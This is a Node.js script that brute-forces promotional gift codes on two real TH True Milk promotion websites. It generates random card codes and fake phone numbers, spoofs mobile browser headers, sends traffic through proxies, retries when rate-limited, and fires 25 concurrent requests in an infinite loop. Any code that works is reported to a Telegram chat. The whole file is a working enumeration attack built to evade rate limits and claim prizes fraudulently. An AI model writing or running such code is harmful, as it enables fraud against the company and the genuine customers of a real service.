const axios = require('axios');
const {agent, checkProxy} = require('./proxy');
const {generateCardCode, generateRandomPhone, getRandomTime} = require('./handlers');
const {sendTelegramMessage} = require('./telegram');
const keep_alive = require('./keep_alive.js');

async function sendDataToAPI(code, retries = 3) {
    if (retries < 0) {
        return null;
    }

    const dataList = [
        {
            url: 'https://quatangyogurt.thmilk.vn/Home/CheckCode',
            gift: `YE${code}`,
            host: 'quatangyogurt.thmilk.vn',
            origin: 'https://quatangyogurt.thmilk.vn',
            referer: 'https://quatangyogurt.thmilk.vn/'
        },
        {
            url: 'https://quatangtopkid.thmilk.vn/Home/CheckCode',
            gift: `TY${code}`,
            host: 'quatangtopkid.thmilk.vn',
            origin: 'https://quatangtopkid.thmilk.vn',
            referer: 'https://quatangtopkid.thmilk.vn/'
        }
    ];

    if (retries < 3) {
        await getRandomTime(4000, 8000);
    }

    try {
        for (const item of dataList) {
            const phone = await generateRandomPhone();
            const postData = `Code=${item.gift}&Phone=${phone}`;
            const response = await axios.post(item.url, postData, {
                headers: {
                    'Host': item.host,
                    'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'x-requested-with': 'XMLHttpRequest',
                    'sec-ch-ua-mobile': '?1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                    'sec-ch-ua-platform': '"Android"',
                    'origin': item.origin,
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': item.referer,
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                    'priority': 'u=1'
                },
                httpAgent: agent,
                httpsAgent: agent,
            });
            const status = response.data.Type;
            const message = response.data.Message;

            if (status !== 'error') {
                const messageText = `${item.referer} .Mã quay ${item.gift}`;
                await sendTelegramMessage(messageText);
            }

            console.log(`${postData} ${message}`);
        }
    } catch (error) {
        if (error.response && (error.status === 429)) {
            const message = `Lỗi ${error.status} thực hiện chạy lại ${code}`;
            console.log(message);
            return await sendDataToAPI(code, retries - 1);
        }
        console.error('Error:', error.status || error.message);
    }
}


async function runMultipleRequests(requests) {
    const promises = [];
    for (let i = 0; i < requests; i++) {
        const code = await generateCardCode();
        promises.push(sendDataToAPI(code));
    }
    await Promise.all(promises);
    console.log(`Đã hoàn tất ${requests} luồng, nghỉ 1 tí...`);
    await getRandomTime(6000, 12000);
}

async function checkProxyAndRun() {
    while (true) {
        const isProxyWorking = await checkProxy();
        if (isProxyWorking) {
            await runMultipleRequests(25);
        } else {
            console.error("Proxy không hoạt động. Dừng lại.");
        }
    }

}

checkProxyAndRun();
